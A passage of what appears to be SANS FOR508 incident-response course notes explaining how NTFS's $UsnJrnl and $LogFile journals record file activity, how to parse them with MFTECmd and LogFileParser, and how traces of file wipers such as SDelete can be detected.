Note: In the journals, “File” events log actions on MFT “FILE”
entries, which store metadata for both files & directories

• Secondary drives often last
much longer (i.e., weeks)

• Stored in large $J ADS

3 GB $J ADS!
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

69

.

NTFS maintains the “Update Sequence Number” change journal in a hidden system file named $UsnJrnl. This
file keeps track of changes to files and directories, along with a code that denotes what type of change occurred.
While the $UsnJrnl provides some functionality to recover from failures (for example, to quickly re-index the
volume),[1] its primary use case is to allow applications to efficiently determine file changes across the volume.
As an example, the Windows Backup application uses the change journal to identify files that have recently
changed, and therefore which files need to be backed up. This is much more efficient than reviewing every file
on the file system periodically to see what has changed (or backing up every file regardless of whether or not it
changed). Numerous other applications use this functionality for similar purposes, including antivirus programs,
the Windows Search Index, and Windows File Replication Service (FRS), and more.[2] This useful change
monitoring feature was at least partially (if not fully) the impetus for Microsoft enabling the $UsnJrnl by default
beginning with Windows Vista. With Windows XP and 2000, it was available but typically not enabled.[3]
Contrary to the $LogFile, the $UsnJrnl logging mechanism is very consistent and concise. Shown in the slide
above are the 3 USN records generated when the same new file tracked on the previous slide generated more
than two dozen events in the $LogFile. The first event, with the “FileCreate” reason code, is indicative of a new
file or directory being created. In both journals, the term “File” typically refers to an MFT “FILE” record,
which is used for storing metadata of both files and directories.
In addition to being more concise, the $UsnJrnl events are also easier to interpret due to the summarizing nature
of the change log. Although we aren’t able to show all the fields in the slide’s screenshot, each USN record
tracks a changed file’s (or folder’s) name, MFT number, its parent directory’s MFT number, a timestamp of the
change, a reason code (indicating what about the file changed), the file’s size, and its attributes (e.g., hidden,
archived, read-only, etc.).
The time period for active entries in the $UsnJrnl is typically much longer than the $LogFile. Most systems will
have several days to a week or more of records in the change journal. Less active systems or secondary drives
will store an even longer duration. When we couple this with the fact that the journals (both of them) are backed
up in volume shadow copies, it’s not uncommon to have well over a month’s worth of change journal data.

© 2023 SANS Institute

.

69

Regarding the storage of the change journal, the records are stored in an alternate data stream, named $J, of the
$UsnJrnl system file. The individual records are not numbered, but instead are tracked based on their offset into
the $J data stream. Each file and directory will have an Update Sequence Number in its MFT record that is
updated following each change, and that value points to the location in the $J where the information about the
change is stored. This is an efficient locating mechanism given that the size of the USN records will vary due to
varying file name sizes.
Given this structure of the $UsnJrnl, it’s actually the $J alternate data stream that needs to be exported for
analysis. Forensic tools are generally needed to extract this data since the $UsnJrnl is a locked and hidden
system file. One more feature of the $UsnJrnl structure worth noting is its size. The $J is a very large sparse
data stream, often topping 3 GB, as we see in the slide’s screenshot from a typical workstation. A sparse file is
a file where much of its data is empty (i.e., filled with 0x00 null bytes). Most modern file systems can
intelligently store sparse files by logically tracking how much data should be filled with null bytes, but not
actually writing the null bytes to disk. This can save a lot of disk space and I/O resources. However, when
copying out the file, the file system will add the nulls back in, so a copy of a large sparse file will create a large
copy. That will usually be the case when extracting this large alternate data stream for analysis. The good news
is that it compresses very well, but the size can be a challenge when dealing with the $UsnJrnl:$J data,
particularly when collecting it remotely.
Despite the challenge, there is one useful side effect of the sparse file used by $UsnJrnl—unallocated records.
Although Windows caps the size of the $UsnJrnl, typically at just 32 MB (you can check with “fsutil usn
queryJournal”), it basically tricks the file system into believing the journal is a much bigger file. This allows the
file system to continue allocating clusters to an existing sparse file it thinks is huge, but mostly full of null data
for which it did not initially allocate clusters. As new records are written to the end of the file, NTFS realizes
there is data that is no longer null and so it allocates additional clusters for the new data to be written. At the
same time, Windows marks the data at the beginning of the file sparse (null), which deallocates those clusters.[4]
This keeps the overall size of the $J on disk relatively constant but leaves a lot of deallocated clusters with USN
records available in unallocated space. As a result, we are often able to recover a significant number of deleted
USN records. We’ll discuss this type of record carving more in the next section of the class.

.

The $UsnJrnl has one other alternate data stream, named $Max. It’s quite small, typically just 32 bytes. It
contains a bit of metadata about the change journal, including its max size.[5][6]
[1] Microsoft Change Journal documentation: https://for508.com/b17f5
[2] Microsoft’s “fsutil usn” documentation: https://for508.com/gnxbc
[3] David Cowen article “Understanding the artifacts USNJrnl”: https://for508.com/z9q08
[4] Carrier, Brian. File System Forensic Analysis. Boston, MA: Addison-Wesley, 2005.
[5] Luis Rocha article “Digital Forensics - NTFS Change Journal”: https://for508.com/cju12
[6] “Advanced $UsnJrnl Forensics" from Forensic Insight: https://for508.com/7qdb2

70

© 2023 SANS Institute

.

Common Activity Patterns in the Journals
•

Due to the somewhat cryptic nature of the journals (particularly the $LogFile), interpretation often
requires understanding activity patterns
Below are several common activities on the file system and a reliable set of codes from the journals
to signify their occurrence (look for the combination of the codes to avoid false-positives)
Action

$LogFile Codes

$UsnJrnl Codes

File/Directory Creation

AddIndexEntryAllocation
InitializeFileRecordSegment

FileCreate

File/Directory Deletion

DeleteIndexEntryAllocation
DeallocateFileRecordSegment

FileDelete

File/Directory
Rename or Move

DeleteIndexEntryAllocation
AddIndexEntryAllocation

RenameOldName
RenameNewName

ADS Creation

CreateAttribute with name ending in
“:ADS”

StreamChange
NamedDataExtend

File Data Modification

* Op codes for $LogFile often are not
sufficient to determine file modification

DataOverwrite|DataExtend|Data
Truncation

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

71

Now that we’ve covered the functionality and structure of the two journals, let’s consider how we can perform
analysis with them. In the notes below, we provide a table of the operation codes for each of the two journals.
Skimming over the two, it’s probably apparent that the $UsnJrnl codes are a little easier to decipher. They are
also better documented, which allowed us to provide an explanation of the USN codes straight from
Microsoft.[1]

.

•

Unfortunately, the $LogFiles events are not as clear, nor as well-documented. Also, the volume of events
created from a single file action further complicates its analysis. However, with some effort and the knowledge
we’ve gained in this section about the components of NTFS, $LogFile analysis can certainly be worthwhile by
adding meaningful context perhaps found nowhere else (depending on the state of the files you are analyzing).
This is especially true given the fact that the $LogFile stores much more information about a file than the
$UsnJrnl, including MFT attributes and $I30 index records. So, if the $LogFile includes a file or directory of
interest, then it may well be worth the effort to analyze the data it contains.
To help you get into meaningful analysis more quickly, we’ve documented a few patterns to look for in each of
the journals for recognizing common activity on the file system. A brief description follows for each. To get
even more details, another reference worth reviewing is an excellent presentation from Forensic Insight titled
“NTFS Log Tracker”. The $LogFile discussion is particularly helpful in dissecting the more complicated events
found in the $LogFile (specifically the “The Event Analysis of $LogFile” section).[2]
Note that for the table in the slide, as well as the descriptions that follow, any time the $LogFile operations
"AddIndexEntryAllocation" or "DeleteIndexEntryAllocation" are mentioned, they could instead be
"AddIndexEntryRoot" or "DeleteIndexEntryRoot", respectively. The difference is based on which part of the
$I30 index tree that the entry resided in. It could be in either the root (stored in the MFT record) or in allocated
clusters (only necessary for larger directories). For brevity's sake, we’ll generically refer to these operations as
the more common "AddIndexEntryAllocation" and "DeleteIndexEntryAllocation".

© 2023 SANS Institute

.

71

hi

de

01

.ir

• $LogFile Marker for File/Directory Creation: NTFS performs many functions with the creation of a file,
which consequently means the $LogFile will record many events. Two $LogFile operation codes that stick
out as a common pattern with the creation of a file or directory is the combination of
“InitializeFileRecordSegment” and “AddIndexEntryAllocation”. Based on our knowledge of NTFS, the
names of these codes should be relatively clear. They should also be a logical pair of events to occur with a
new file or directory creation. When either is created, a new “FILE” record must be allocated in the MFT to
store its attribute information. This is tracked in the $LogFile with an “InitializeFileRecordSegment” event,
which not only indicates this occurred, but the $LogFile also keeps a copy of the data to be written into the
MFT. Parsing this event is effectively equivalent to using the “istat” tool we looked at earlier to parse MFT
records. Not bad! Likewise, a new file or directory will require an index entry to be created in its parent
directory. The “AddIndexEntryAllocation” operation code records this event, and once again, the payload of
the event includes the data to be added to the index. This is like parsing a $I30 index entry, which includes
key information such as the item’s name, its MFT record number, its parent MFT record number, and a full
set of $STANDARD_INFORMATION timestamps. All of this is recorded in the $LogFile too! The
combination of these two events together is a great marker for the creation of a file or directory.
• $UsnJrnl Marker for File/Directory Creation: The $UsnJrnl’s codes are higher-level indicators of the actions
on the file system. This is nice because it generally summarizes a lot of lower-level activity into just a single
event. Here we see a very clear indicator of a file or directory creation with the event “FileCreate”. Keep in
mind that the term “File” here corresponds to a “FILE” record in the MFT, which applies to both files and
directories.
• $LogFile Marker for File/Directory Deletion: Deleting files and directories is not the exact opposite of
creating them, but it’s close. Certainly, the removal of the MFT “FILE” record and the index entry in the
parent directory are two necessary components of deletion, so finding “DeleteIndexEntryAllocation” and
“DeallocateFileRecordSegment” together is a great marker for deletion.
• $UsnJrnl Marker for File/Directory Deletion: Once again, the $UsnJrnl’s code is very descriptive and
straightforward. A “FileDelete” code indicates the deletion of a file or directory.
• $LogFile Marker for File/Directory Rename: When renaming a file or directory, Windows will delete the
parent directory’s index entry for the old name and create a new index entry with the new name. This is
recorded in the $LogFile as “DeleteIndexEntryAllocation” and “AddIndexEntryAllocation” events. The
combination of these events occurring simultaneously is a strong indicator of a rename event.
• $UsnJrnl Marker for File/Directory Rename: When renaming a file or directory, the $UsnJrnl nicely
documents two events at the same time. The log will show a “RenameOldName” with the old file or
directory name, immediately followed by a “RenameNewName” with the new name. Not only does this
make it clear that a rename occurred, it documents the names before and after the change.
• $LogFile Marker for File/Directory Move: When moving a file or directory, Windows will delete the index
entry for the old parent directory location and create a new entry in the new parent’s index. This is recorded
in the $LogFile as “DeleteIndexEntryAllocation” and “AddIndexEntryAllocation” events. Although it’s the
same pair of events we used to mark a rename, we can distinguish it by noting that (1) the name doesn’t
change, and (2) its parent directory does change.
• $UsnJrnl Marker for File/Directory Move: When moving a file or directory, the $UsnJrnl documents two
events at the same time. Although somewhat confusing, it’s the same pair of events as a rename. A
“RenameOldName” event occurs before the move, immediately followed by a “RenameNewName” after the
move. Although it’s the same pair of events we used to mark a rename, we can distinguish it by noting that,
(1) the name doesn’t change, and (2) its parent directory does change.
• $LogFile Marker for ADS Creation: Creation of alternate data streams happens legitimately in a number of
situations. However, they’re not usually created frequently, so looking for ADS creations could lead to
spotting anomalous behavior. For example, attackers may use alternate data streams to hide their malware.[3]
Or they may download executables or scripts that create the “Zone.Identifier” ADS. Since Windows will
typically prevent running an executable or PowerShell script with this “Mark of the Web” ADS, an easy fix
attackers take is simply deleting the ADS. Testing does not show a clear way to identify the deletion of an
ADS in the $LogFile, but it does show a clear sign of its creation. When records reference alternate data
streams, the stream name is followed by the string “:ADS” (e.g., "name":"Zone.Identifier:ADS“).
When an ADS is created, a record for “CreateAttribute” will be logged with payload data referencing the
stream name followed by “:ADS”. Overall, it would be unlikely for the $LogFile to have a significant
number of events referencing alternate data streams, so a simple review of all events with “:ADS” could
reveal interesting activity related to stream data.
72

© 2023 SANS Institute

.

.

• $UsnJrnl Marker for ADS Creation: The $UsnJrnl logs the creation, deletion, or rename of an ADS with the
code “StreamChange”. Although this label is a bit nondescript, it’s exactly the activity we would like to
identify for significant changes to alternate data streams. To tie it specifically to an ADS creation, the code
“NamedDataExtend” should follow, indicating data was added to a named stream (a newly created stream in
this case). Note that testing has shown there may be a delay of a few seconds between the initial
“StreamChange” and the “NamedDataExtend” events.
• $LogFile Marker for File Data Modification: The $LogFile tracks low-level changes to the NTFS metadata
structures. It does not directly monitor changes to the data of files. Of course, changes to a file’s data will
cause changes to its metadata as well, such as $Bitmap allocation status, changes to the $DATA attribute,
changes to timestamps in $STANDARD_INFORMATION and $FILE_NAME attributes, and so on. Those
metadata changes can vary from one file's modification to the next based on whether the data was resident,
non-resident, it transitioned from resident to non-resident, or vice versa. Additionally, there are
complications such as a defrag, which cause changes to the location of data but not the data itself (i.e., the
data moves to new clusters, but the file’s data is not actually modified; this cluster move would be tracked by
$LogFile). In short, there are a number of variables to consider which affect what metadata is changed and
how we interpret it. One idea that may initially seem promising is that since the $LogFile does log updates
to attributes, such as the $STANDARD_INFORMATION attribute with its full set of timestamps, perhaps
we could search for changes to a file’s Last Modification timestamp in the embedded payload data. The
problem there is that the $LogFile does not report the previous settings for the attribute, it only tracks the
data it is about to write to the attribute. Therefore, we cannot directly determine from the $LogFile which
part of the attribute changed in that particular transaction. However, with manual analysis, one could
compare the Last Modification timestamp in that transaction with the file’s current Last Modification
timestamp to check for differences, and thus a modification time that was previously unknown. So, there are
certainly opportunities to check for file modifications, but currently it is not a simple process. The $LogFile
is still being researched and we may later have tools that can put various pieces of the puzzle together to
accurately flag file modification, but currently it is challenging to do so reliably.
• $UsnJrnl Marker for File/Directory Modification: Where the $LogFile makes file modification very
challenging to spot, the $UsnJrnl makes it trivial. There are three USN reason codes that are clearly
dedicated to data modification of the primary data stream. They are DATA_EXTEND,
DATA_OVERWRITE, and DATA_TRUNCATION. See the chart below for Microsoft’s description of
these change codes.
The common patterns described above will hopefully prove useful for getting started with journal analysis. As
you continue to dive deeper into the journals, the following list of codes should be a helpful reference as well.
USN Journal “Reason” Codes:

© 2023 SANS Institute

.

73

.
$LogFile Operation Codes:
Next is a list of the known $LogFile codes.[4] Unfortunately, there is very little documented about them.
However, many of the names are self-explanatory, especially when combined with the data from the event
payload.

74

© 2023 SANS Institute

.

.

[1] Microsoft’s documentation of USN_RECORD_V3 structure: https://for508.com/19cxy
[2] “NTFS Log Tracker” by Forensic Insight: https://for508.com/9f0ow
[3] Exe_ADS_Methods.txt: https://for508.com/s570f
[4] TZWorks’ “mala” user guide: https://tzworks.com/prototypes/mala/mala.users.guide.pdf

© 2023 SANS Institute

.

75

Useful Filters and Searches in the Journals
Parent directory filtering is a powerful technique with journal logs
Parent Directories to Filter

Investigative Relevance

C:\Windows & C:\Windows\System32

Directories coveted by attackers

C:\Windows\Prefetch

Attackers often delete prefetch files

Attacker’s working directories

Discover unknown attacker tools and exfil

Temp directories

Focus on executables

C:\Users\*\Downloads

Find recently downloaded files

C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent

Find additional times and files opened by users

C:\$Recycle.Bin\<SID>

Check for deleted files prior to Recycle Bin empty

Search for file types or names of interest created or deleted recently
• Executables (.exe, .dll, .sys, .pyd)

• Scripts (.ps1, .vbs, .bat)

• Archives (.rar, .zip, .cab, .7z)

• IOC file/directory names

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

When we look at the output of a file system timeline, or similar analysis against the $MFT, we are looking at the
state of files and directories at the exact point in time when the $MFT file was acquired. Of course, that
provides a plethora of useful information, and it may well be sufficient for our investigative needs. However,
the exciting part of adding in journal analysis is that it opens up a rolling history of activity that occurred on the
file system.
As a quick example, consider a file of interest that was renamed, then moved, and then deleted. By analyzing
the MFT, if we’re lucky and the file’s unallocated MFT record was not reused, then we can determine the file’s
name and location at the time of deletion. However, we wouldn’t know when it was deleted because MFT
timestamps are not updated with deletion. Now contrast that with journal analysis, where we can observe the
history of this file. We can determine that it was renamed, when it was renamed, and its prior name. Similarly,
we can determine that it was moved, when it was moved, and its previous location. Lastly, we can determine for
certain that the file was deleted and when it was deleted. Pretty powerful!
Considering this level of visibility, there are a number of creative searches and filters which can be used that
often lead to interesting new discoveries. Since both journals track parent directory MFT entries of all files, it
can be very illuminating to create a filter for any file changes within directories of interest. Generally speaking,
it makes sense to analyze the $UsnJrnl first due to its longer time horizon and easier to read format. Analysis
can continue with the $LogFile to get additional context.
Some interesting parent directory filters include:
• C:\Windows & C:\Windows\System32: These two directories are coveted by attackers because they allow
malware to blend in and look like normal Windows executables. Files and directories get created or deleted
in these directories only occasionally, so activity here is always worth validating.
• C:\Windows\Prefetch: Attackers often target prefetch files in their cleanup efforts, so it is not uncommon for
all or a subset of .pf files to be deleted during an intrusion. Looking for deletions here can provide valuable
intel on the attacker’s TTPs. Additionally, even if the prefetch files were not deleted, observing changes to
the .pf files here provides another way to look for times of execution. This can be particularly useful on
Windows 7, which only tracks the most recent runtime in the prefetch files.
76

© 2023 SANS Institute

.

76

• Attacker’s working directories: Discovering the directories attackers are using to store their files is a big find
for investigations. It allows us to scope our environment looking for similar directories on other machines.
Furthermore, discovering the files within the directories provides even more IOCs for scoping. By filtering
the journals for files within the attacker’s directories, we may be able to discover a whole host of items that
the attacker had at one time and later deleted or moved. Here’s an example from our case to illustrate this
capability. We are filtering on a parent MFT entry number of 111311, which was the entry number for the
attacker’s “Perfmon” directory. None of these three items were in the Perfmon directory on the active file
system, so this is considerable visibility we would not get from reviewing the $MFT alone.

.

• Temp directories: Temp directories are often the initial landing spot for exploits hitting victim machines.
Since they are temporary in nature, the ability to look back in time for suspicious executables or scripts can
be very useful.
• C:\Users\*\Downloads: This is likely more for end user investigations but tracking file downloads can be
insightful.
• C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent: LNK file analysis within users’ Recent folders
can help us discover files opened. In intrusion cases, it is not unusual for attackers to get interactive access
to the desktop in order to facilitate their data discovery efforts. They may open files for review before
exfiltrating. Looking for LNK files that have been deleted or finding additional modification times of
existing LINK files (indicating file opening) can help with our understanding of the attacker’s objectives and
achievements.
• C:\$Recycle.Bin\<SID>: This is another artifact more likely useful for end user investigations. Although
attackers often get access to the desktop, which brings the Recycle Bin into play, it would be a pretty lazy (or
uninformed) attacker that would simply recycle a file instead of a hard Shift-Delete. In any case, focusing on
files added to the Recycle Bin of a user in question can result in important findings.
In addition to examining the activity within interesting parent directories, there are certain file types and names
that are useful to search for regardless of their location. These may include:
•
•
•
•

Executables files, for example .exe, .dll, .sys, .pyd
Scripts, such as .ps1, .vbs, .bat files
Archive files such as .rar, .7z, .zip, .cab
Any IOC file or folder names discovered during the investigation

Note that searching for common executable extensions such as .exe and .dll can yield a lot of results. This may
be due to Windows update and similar factors. These may be best searched by filtering for directories of
interest, such as C:\Windows\System32 and users’ temp directories.

© 2023 SANS Institute

.

77

LogFileParser for $LogFile Analysis
LogFileParser.exe /LogFileFile:E:\C\$LogFile /OutputPath:G:\output
Primary output file is “LogFile.csv” (shown below). Many supporting files created with additional details.

Log Sequence
Number (LSN)
orders entries

“Redo” operation is
what it’s about to do;
“Undo” is how to
back it out

File or Directory
name being
updated

Identifies which
attributes are
being changed

When applicable,
provides pointers
to payload data in
supporting files

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

When it comes to the $LogFile, historically there have not been a lot of tools that could parse it. This is due to
several factors, including its complexity, the fact that it’s not well-documented, and the shorter timeframe of its
logs means it may not be as relevant as the $UsnJrnl. That said, it does contain the full payload of data written
to important structures like the $MFT, $I30 indexes, $Bitmap, and the $UsnJrnl. As such, we’re fortunate to
have a few brave souls who have put in the time and effort to understand its format and write tools for it.
An incredibly capable and free tool comes from Joakim Schicht, called “LogFileParser”. It handles the
complexity of the $LogFile in several creative ways. The primary output file, which is designed to give an
overview of the data contained in the $LogFile, is aptly named “LogFile.csv”. This is a good starting point in
many cases. It will be a large file, typically with 100,000 rows or more, and over 60 fields parsed out (although
many fields will be blank for any particular event). It includes summary information about each event in the
$LogFile. That summary information can still be rather verbose, which is an indicator of just how much data is
available in the $LogFile. When even more details are available for an event, the “lf_TextInformation” field
points to supplementary files that store the additional data. One of the examples on the slide above shows a
pointer to the file “LogFile_INDX_I30.csv”. Since the $LogFile maintains all the data that’s to be written to
structures such as $I30 index entries, we can recover all of that useful metadata from the $LogFile. In the case
of the index entries, “LogFile_INDX_I30.csv” contains file and directory names, $SI MACB timestamps, file
sizes, flags, MFT record numbers, and parent MFT record numbers.
When searching for specific files or directories, there’s a dedicated output file named “LogFile_FileNames.csv”,
which collects file and directory names found in various attributes within the $LogFile and puts them in a single
CSV. Included with the names are the files’ MFT record numbers and Log Sequence Numbers (LSN). The LSN
is critical to making sense of the chronological nature of the $LogFile. Although the $LogFile does not directly
include timestamps for each event, it does tag each event with a Log Sequence Number, which increases in
value with each new event. For example, if we find a file name of interest in $LogFile_FileNames.csv, we can
get the LSN value from that CSV and locate it in the larger LogFile.csv to see what occurred around that time
frame. To determine actual times, we have to rely on the payload data in the $LogFile from structures like the
$UsnJrnl and $I30 index entries. The $UsnJrnl in particular includes a timestamp with every update, and since
the full payload of the $UsnJrnl updates are also in the $LogFile, we can infer timestamps that way.

78

© 2023 SANS Institute

.

78

Parsing the $LogFile can be useful for more than recovering metadata about files of interest. It can sometimes
be useful in recovering file data itself. Although it doesn’t store the file’s actual data, it does store cluster run
information for file data. In a scenario where an important file was recently deleted, and the MFT record
subsequently reused and overwritten by a new file, we could potentially find the original cluster locations for the
deleted file in the $LogFile. LogFileParser includes the option “/ReconstructDataruns” for just this purpose. This
is an especially powerful technique when dealing with fragmented files, which usually would not be fully
recoverable using standard file carving techniques.

.

There is a lot more to the LogFileParser tool than we can cover here. Be sure to check the full write-up at the
project’s home on Github.[1] As you will see, there are many options available when running the tool, which can
be executed via a GUI interface or at the command-line. Running it at the command-line can be as simple as
pointing it to the $LogFile (e.g., LogFileParser.exe /LogFileFile:E:\C\$LogFile). If no other options are
provided, it will create an output directory in the same path as the LogFileParser.exe program. Otherwise, add
the option “/OutputPath” to specify where to create the files. To run the GUI, simply double-click on the
executable (found in “C:\Forensic Program Files\jschicht\LogFileParser” on the FOR508 Windows VM).

Unfortunately, the availability of forensic tools that can parse the complex $LogFile is quite limited. We are
lucky that Mr. Schicht dedicated his time to understanding this log format and provided the community with
such a powerful and free tool to help us decipher it. Another tool worth considering is TZWorks’ “mala”. [2]
TZWorks’ tools are commercial tools, but if interested, a trial version can be requested for evaluation purposes.
Mala is a great tool to analyze the $LogFile because it processes the data very quickly, it consolidates the
$LogFile’s verbose data in a relatively concise way, and it’s actively being developed and supported. Also note
that whether you are interested in purchasing tools from TZWorks or not, their documentation is freely available
online, and they typically do an excellent job of detailing how forensic artifacts work, along with how their tools
parse them. This is certainly true of the mala user’s guide.[3]
[1] LogFileParser from Joakim Schicht: https://for508.com/j6rev
[2] TZWorks mala overview page: https://for508.com/p9qwv
[3] TZWorks $MFT and $Logfile Analysis (mala) Users Guide: https://for508.com/feb70

© 2023 SANS Institute

.

79

MFTECmd for $UsnJrnl Analysis
mftecmd.exe -f E:\C\$Extend\$J –m E:\C\$MFT --csv G:\output –csvf usnjrnl.csv
Add --vss to have all volume shadow USN journals parsed automatically!

File/Directory
Name

MFT # &
Parent MFT #

Update
Timestamp

Update Reason
Code(s)

Update Seq.
Number

Attribute
Flags

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

The $UsnJrnl provides a high-level view of changes to the NTFS volume. It’s typically an investigator’s first
choice for analyzing a volume’s change history because its format is compact and straightforward, making it
fairly easy to interpret. Importantly, the time period it covers is also significantly longer than the $LogFile in
most cases. We are fortunate to have multiple tools available which can parse the $UsnJrnl. A great option is
Eric Zimmerman’s MFTEcmd.
Running mftecmd against a $UsnJrnl is almost exactly the same as the running it against the $MFT. We simply
specify $J alternate data stream file in addition to the $MFT file. A typical run of mftecmd against the $UsnJrnl
would look like the following:
mftecmd.exe -f E:\C\$Extend\$J –m E:\C\$MFT --csv G:\output --csvf usnjrnl.csv

In this case, we run mftecmd against a $UsnJrnl:$J ADS file that was acquired into a KAPE triage image
mounted at E:. When the $MFT is included (-m), MFTEcmd will cross reference the MFT Entry Number and
Parent Entry Number references in the journal with those records in the $MFT to build full path information. We
specify CSV format and direct the output to G:\output directory with a name of “usnjrnl.csv”. The screenshot in
the slide shows a small sample resulting from a run against 2018 compromised host base-rd-01. The total
number of records it parsed was 384,493, covering almost exactly 3 days of change history (70 hours).
We’ve mentioned the journals are also maintained in volume snapshots, and mftecmd gives us an easy option to
access those with the “--vss“ switch. With access to a full disk image mounted as “F:”, we can run it as follows
to automatically create UsnJrnl CSVs for each snapshot:
mftecmd.exe -f F:\$Extend\$UsnJrnl:$J –m E:\C\$MFT --vss --csv G:\output --csvf usnvss.csv

Notice in this case the drive letter and path has changed from our first example where we processed a $J from a
KAPE triage acquisition. In this case, we are running it against the full disk image mounted with Arsenal Image
Mounter on the F: drive. The output in this example resulted in 3 files—one for the active change journal and
another for each of the 2 volume shadow copies present:

80

© 2023 SANS Institute

.

80

G:\output>dir *usn-vss.csv
Volume in drive G is Cases
Volume Serial Number is FA01-3FB0
Directory of G:\output
2020-06-16
2020-06-16
2020-06-16

03:05 PM
03:05 PM
03:05 PM
3 File(s)

62,342,381 usn-vss.csv
2,061,860 VSS5_20180901135311_usn-vss.csv
70,002,478 VSS6_20180905205308_usn-vss.csv
134,406,719 bytes

Note that mftecmd has a “--dedupe“ option that will check the hash of each input file. If there are any matches,
it will parse just the first file discovered with that hash. However, it would be very unlikely that any of the $J
streams would match across snapshots.
TZWorks also has a nice tool for parsing the change journal. It is called “jp” and includes useful features for
carving for USN records. We will discuss this type of records carving more in the next section.[1]

hi

de

01

.ir

[1] TZWorks’ jp user guide: https://for508.com/jpiex

© 2023 SANS Institute

.

81

NTFS: What Happens When a File Is Deleted?
Data Layer
• Clusters will be marked as unallocated in $Bitmap, but data will be left intact until clusters are reused
• File data as well as slack space will still exist

Metadata Layer
• A single bit in the file’s $MFT record is flipped, so all file metadata will remain until record is reused
• $LogFile, $USNJrnl, and other system logs still reference file

Filename Layer
• $FILE_NAME attribute is preserved until MFT record is reused
• $I30 index entry in parent directory may be preserved
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

After a long discussion of the innerworkings of NTFS, it may be helpful to step back and look at one of the key
tasks of the file system—and one that especially impacts forensic analysis—file deletion. The above steps are
not necessarily in order, and in fact, this is not even all the steps that actually occur. However, they should
serve as a nice reminder of the many mechanisms in place to provide a resilient file system, as well as the key
resources we have as forensic analysts to mine NTFS for file system artifacts.
When a file is deleted, NTFS performs the following tasks:
• MFT record is marked as available but is not immediately overwritten. It may exist completely intact for
some time.
• $Bitmap file marks associated clusters as available. The clusters themselves are not touched. They may be
reused (overwritten) eventually, or they may not.
• Parent directory’s index marks the entry as available. This may trigger a rebalancing of the index, which
may or may not overwrite the file’s index entry.
• $LogFile is updated to reflect transaction occurred.
• $USNJrnl is updated to reflect file’s deletion (if enabled—$UsnJrnl not enabled in XP and prior)
• $Secure, $ObjID, and $Quota are updated (if applicable to the file).

82

© 2023 SANS Institute

.

82

Lab 5.3
NTFS File System Forensics
Average Time: 45 Minutes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

83

.

This page intentionally left blank.

© 2023 SANS Institute

.

83

Advanced Adversary and Anti-Forensics Detection Agenda

Anti-Forensics Overview
Recovery of Deleted Files via VSS
Advanced NTFS Filesystem Tactics
Advanced Evidence Recovery
Defensive Countermeasures
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

84

© 2023 SANS Institute

.

84

Detecting and Overcoming Anti-Forensics

• What if the data you expect to
find is nowhere to be found?
• Perhaps that exonerates the system
• Or, perhaps file wipers, privacy
cleaners, or similar anti-forensics
techniques were employed

• We can look for signs
anti-forensics data destruction
activity
• We can also use advanced
recovery techniques to dig deeper
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

85

.

As intrusions and other computer crimes continue to increase in frequency, so do perpetrators’ attempts to hide
their actions. This is a trend that’s unlikely to change any time soon. For network intrusions in particular,
attackers are being forced to work harder to hide their activities in order to avoid being detected. This is
generally a result of organizations improving their security postures. Of course, we certainly don’t want to slow
down organizations’ security strides, it’s still worth noting the side effect it has of pushing attackers towards
more anti-forensics steps in order to remove their traces (or at least attempt to).
One common anti-forensics method often observed with intrusions is the use of file wipers. File wipers take
steps to immediately overwrite deleted files rather than allowing it to sit unaltered temporarily. Once a file is
overwritten, that particular version of the file is effectively gone. However, we’ve already discussed some
methods that may allow us to get back to the file as it existed before being overwritten. In particular, volume
shadow copies can easily work around data wiping/deletion, when available of course. We’ll come back to the
topic of volume shadow copies shortly, but outside of that, then often our best bet is taking advantage of the fact
that file data rarely resides in only one location on the drive. Windows and its applications have multiple
features and behavioral characteristics the lead to copies of files, or the files’ data, showing up in other places.
We’ll see a few examples of this moving forward.
Before we get into the data recovery part of the discussion, let’s consider some of the tools that our adversaries
may use to hide their actions. We’ll look at a few specific examples of data wipers and privacy cleaners. We’ll
also highlight common traits of these tools that can tip us off that this type of anti-forensics is in play.

© 2023 SANS Institute

.

85

Example of File Wiping with SDelete

SDelete from Microsoft’s Sysinternals tool suite
• Wipes files,
directories,
and free space
• However, many
artifacts remain

USNJrnl

Windows
Search Index
“gather” logs
Prefetch

$I30 slack

01

.ir

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

hi

de

SDelete is a popular file wiper and serves as a nice example of the methods that wipers use to scrub data from
the file system. One reason SDelete is popular with attackers is because it’s signed by Microsoft. It will,
therefore, avoid many whitelisting and antivirus blocks and detections. Additionally, this often turns into a
“living off the land” tool, since administrators commonly use the Sysinternals utilities on their servers and
workstations.
In this slide, we see a number of telltale signs of a file wiper’s use, as well as which wiper. Looking at each
artifact in turn, towards the top-right we see the result of parsing the $UsnJrnl. One of the amazing aspects of
the journal is that it’s providing a rolling history of changes. In this case, we’re seeing a series of successive
changes to the name of the file with MFT entry number 47736. It was originally named “Nokia Strategy.docx”,
but as we see, it subsequently had a lot of name changes following an alphabetical renaming scheme. This is
expected behavior and even documented on the SDelete page on Microsoft’s website:[1]
To overwrite file names of a file that you delete, SDelete renames the file 26 times, each time replacing
each character of the file's name with a successive alphabetic character. For instance, the first rename
of "foo.txt" would be to "AAA.AAA".
This activity sticks out very plainly. Notice also that the first two entries have a USN reason code of
“DataOverwrite”. We are getting an indicator from the journal that the data has also been altered. No surprise
for a file wiper! The SDelete documentation describes that wiping files with no special attributes (i.e., not
compressed, encrypted, or sparse) is a simple matter of overwriting the file with a secure delete pattern.
To the middle-left, we see a similar set of filenames as what’s parsed from the $UsnJrnl. This is an artifact of
the Windows Search index. Specifically, it’s a clear-text gather log (“.gthr”) from
C:\ProgramData\Microsoft\Search\Data\Applications\Windows\GatherLogs\SystemIndex. It’s not an accident
that these first two artifacts look so similar. The Windows Search index takes advantage of the USN change
journal to efficiently discover changes on the file system. For changed files that are in a location to be indexed,
and do not have the “FANCI” (File Attribute Not Content Indexed) bit set, their URI paths get added to the
